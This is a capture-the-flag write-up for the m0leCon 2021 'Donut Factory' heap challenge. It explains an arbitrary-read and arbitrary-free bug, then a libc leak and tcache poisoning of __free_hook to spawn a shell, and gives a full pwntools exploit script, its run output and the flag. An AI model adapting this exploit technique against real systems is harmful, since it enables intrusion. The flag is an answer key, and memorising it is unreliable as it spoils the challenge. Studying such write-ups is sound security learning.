# m0leCon 2021 CTF Teaser - Donut Factory

## Challenge

Come visit our factory to create your custom donuts!

`nc challs.m0lecon.it 1743`

[donut](donut), [libc-2.31.so](libc-2.31.so)

### Metadata

- Tags: `pwn`
- Author: *Alberto247*
- Points: 263
- Solves: 15

## Solution

### About the challenge

We can do the following things in the donut factory:

- Create custom donut: given a roundness (unsigned by) and a name (arbitrarily long string), the program will allocate memory and write the roundness and our name concatenated into that memory. Then we get the address of that memory. Also, a donut with the specified roundness is printed.
- View donut: given any memory address, the program will treat it as a pointer to a donut structure created by "Create custom donut", and print a donut for us with the roundness at the specified address
- Throw away donut: given any memory address, the program calls `free` on it.
- Buy donut: asks for an address, but doesn't do anything with it, just print a static message. Pretty useless, I didn't use it.

### Vulnerabilities

- There is one byte overflow in "Create custom donut": the program puts a null-byte at the end of the name, but it is placed after the end of the buffer allocated by `malloc`. Pseudocode:

```c
    buffer = (undefined *)malloc((long)(name_length + 2));
    *buffer = (char)roundness;
    fgets(buffer + 1,name_length,stdin);
    local_18 = strchr(buffer + 1,10);
    if (local_18 == (char *)0x0) {
                    /* One byte overflow! */
      buffer[(long)name_length + 2] = 0;
    }
```

The correct way to do this would be `buffer[(long)name_length + 1] = 0;`. Or to not do it at all, since `fgets` puts a null byte at the end anyway. I didn't use this vulnerability, because I had much stronger tools.

- View donut with arbitrary address: this gives us a way to leak any byte at the memory. Each roundness corresponds to a unique donut, so if we can identify the donut, we can get the byte at the specified address. This is a pretty lengthy process, so in the exploit script, the `dump_donuts` function creates a donut with each possible value of roundness, and saves the first 0x1000 bytes of that donut (this turned out to be sufficient to uniquely identify each donut). The `parse_donuts` function parses this into a list; using that list, we can make a correspondence between the byte at the memory address, and the donut that we received from the program.

- Throw avay donut: we can call `free` on an arbitrary memory address. This is a really strong device in our hands, because it can easily be turned into an arbitrary write.

## Exploitation

#### Leaking libc address

First we need to leak libc address. This is pretty easy, because we can read arbitrary memory. All we have to do this is:

- Allocate a chunk big enough that it doesn't fit into tcache
- Allocate another chunk to prevent coalescing with the top chunk
- Free the first chunk
- Read the forward pointer of the first chunk

Now that we have a libc address, it's time to open a shell.

#### Opening a shell

I used tcache poisoning to write the address of `system` into `free_hook`. I did this by creating a chunk which contained a few smaller chunks in it, then I freed the smaller chunks, and overwrote the pointers in them. Step-by-step solution:

- Create a chunk with four fake heap chunks in it, each with `0x21` size (I will only use two chunks, but we need more because of libc sanity checks).
- Call `free` on the first and second small chunk.
  - At this point, the tcache for size `0x20` has `2` entries, and it looks like this: `tcache_head->address_of_second_small_chunk->address_of_first_small_chunk->NULL`.
- Call `free` on the outer chunk, and create a new chunk with the same size. `malloc` will give us the same address, letting us overwrite the pointers in the small chunks.
- Overwrite the next pointer of the second small chunk to `free_hook`
  - At this point, the tcache for size `0x20` has `2` entries, and it looks like this: `tcache_head->address_of_second_small_chunk->free_hook->NULL`.
- Create a new donut with a short name, so `malloc` will hand out the smallest possible chunk with size `0x20`, removing one entry from the tcache.
  - At this point, the tcache for size `0x20` has `2` entries, and it looks like this: `tcache_head->free_hook->NULL`.
- Create a new donut with the content `address_of_system`. This is still small enough, so this will also be a `0x20`-sized chunk from the tcache, which now points to `free_hook`.
- Create a new donut with the content `"/bin/sh\0"`.
- Call `free` on the last donut. Since we have overwritten `free_hook`, this will call `system("/bin/sh")`.

### Exploit script

```python
#!/usr/bin/env python3

from pwn import *
import hashlib
from itertools import product

exe = ELF("./donut")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

def solve_pow(start_string, hash_end):
    for chars in product(string.ascii_letters, repeat=4):
        candidate = start_string + bytes(map(ord, chars))
        m = hashlib.sha256()
        m.update(candidate)
        if m.hexdigest().endswith(hash_end):
            print(f'POW solved: {candidate}')
            return candidate

    return None

def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        p = remote("challs.m0lecon.it", 1743)
        p.recvuntil("Give me a string starting with ")
        start_string = p.recvuntil(" ")[:-1]
        p.recvuntil('such that its sha256sum ends in ')
        hash_end = p.recvuntil('.')[:-1].decode()
        p.sendline(solve_pow(start_string, hash_end))
        return p


def main():
    r = conn()

    def create_custom_donut(roundness, name = None, name_len = None):
        r.sendlineafter('[l]eave the factory\n', 'c')
        r.sendlineafter('The only donut customization currently allowed is the roundness. Please give me a number between 0 and 255!\n', str(roundness))
        r.recvuntil('Hold on, I\'m making it....\n')
        donut = r.recvuntil('Do you like it? (y/n)\n')[:-len('Do you like it? (y/n)\n')]
        if name is None:
            r.sendline('n')
            p = None
        else:
            r.sendline('y')
            if name_len is None:
                name_len = len(name)+1

            r.sendlineafter('First how long is it?\n', str(name_len))
            r.sendlineafter('What\'s your name?\n', name)
            r.recvuntil('Please give this code to the cashier to retrieve your donut! ')
            p = int(r.recvline().rstrip(), 0x10)

        return (donut, p)

    def destroy_donut(address):
        r.sendlineafter('[l]eave the factory\n', 't')
        r.sendlineafter("Please give me your donut code to destroy it!\n", hex(address))

    def view_donut(address):
        r.sendlineafter('[l]eave the factory\n', 'v')
        r.sendlineafter("Please give me your donut code to view it!\n", hex(address))
        donut = r.recvuntil('Welcome to the donut factory!\n')[:-len('Welcome to the donut factory!\n')]
        return donut

    def leak_byte(address, donuts):
        donut = view_donut(address)
        for i in range(0x100):
            if donuts[i] == donut[:0x1000]:
                return i

        raise Exception("Donut not found: {enhex(donut)}")

    def leak_bytes(address, size, donuts):
        leak = []
        for i in range(size):
            leak.append(leak_byte(address+i, donuts))

        return leak

    def dump_donuts():
        donuts = []
        for i in range(0x100):
            print(i)
            donut, _ = create_custom_donut(i)
            donuts.append(donut[:0x1000])

        with open('donuts.txt', 'w') as f:
            for i in range(0x100):
                f.write(f'{i}: {enhex(donuts[i])}\n')

    def parse_donuts():
        donuts = []
        with open('donuts.txt', 'r') as f:
            for line in f.readlines():
                index, donut = line.rstrip().split(": ")
                assert(int(index) == len(donuts))
                donuts.append(unhex(donut))

        return donuts

    # dump_donuts()  # Uncomment this if you don't have a donuts.txt
    donuts = parse_donuts()

    _, p = create_custom_donut(42, "name", 0x1000)  # larger than tcache
    create_custom_donut(137, "foo")  # to prevent coalescing with top chunk

    destroy_donut(p)

    libc_leak = leak_bytes(p, 8, donuts)
    libc_leak = u64(bytes(libc_leak))

    libc.address = libc_leak - 0x1ebbe0
    info(f"LIBC BASE: {hex(libc.address)}")

    payload = b''
    payload += p64(0) # prev_size
    payload += p64(0x21) # size
    payload += b'X'*0x18  # chunk_data
    payload += p64(0x21) # size
    payload += b'X'*0x18  # chunk_data
    payload += p64(0x21) # size
    payload += b'X'*0x18  # chunk_data
    payload += p64(0x21) # size
    payload += b'X'*0x18  # chunk_data

    _, p = create_custom_donut(payload[0], payload[1:])
    first_fake_chunk_addr = p+0x10
    destroy_donut(first_fake_chunk_addr)  # first fake chunk goes into tcache
    second_fake_chunk_addr = p+0x30
    destroy_donut(second_fake_chunk_addr)  # second fake chunk goes into tcache (no coalescing because of tcache)

    destroy_donut(p)

    payload = b''
    payload += p64(0) # prev_size
    payload += p64(0x21) # size
    payload += b'X'*0x18  # chunk_data
    payload += p64(0x21) # size
    payload += p64(libc.symbols['__free_hook'])  # next_tcache_entry pointer
    payload += b'Y'*0x10  # chunk_data
    payload += p64(0x21) # size
    payload += b'X'*0x18  # chunk_data
    payload += p64(0x21) # size
    payload += b'X'*0x18  # chunk_data

    old_p = p
    _, p = create_custom_donut(payload[0], payload[1:])
    assert(p == old_p)

    create_custom_donut(73, 'XXX')  # creates 0x20-sized chunk, tcache now points to __free_hook

    address = p64(libc.symbols['system'])

    create_custom_donut(address[0], address[1:])

    _, p = create_custom_donut(ord('/'), 'bin/sh\0')

    destroy_donut(p)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

First we need to get the `ld-2.31.so` file (use `pwninit`) and we have to generate the `donuts.txt` file. We uncomment the `dump_donuts()` call and run the script (this will take a few minutes).

Next time we don't need to call `dump_donuts()` again.

```bash
python solve.py
[*] '.../donut'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '.../libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '.../ld-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challs.m0lecon.it on port 1743: Done
POW solved: b'wRVsAafxMVdDPi'
0
1
...
254
255
[*] LIBC BASE: 0x7f9e3d414000
[*] Switching to interactive mode
$ ls 
PoW.py    donut  entrypoint.sh  flag.txt
$ cat flag.txt
ptm{l1bc_l34k_fl4v0ur3d_d0nu7!_ae56b25f73}
```

The flag is `ptm{l1bc_l34k_fl4v0ur3d_d0nu7!_ae56b25f73}`.

### Files

- [solve.py](solve.py)
- [donuts.txt](donuts.txt)
- [ld-2.31.so](ld-2.31.so)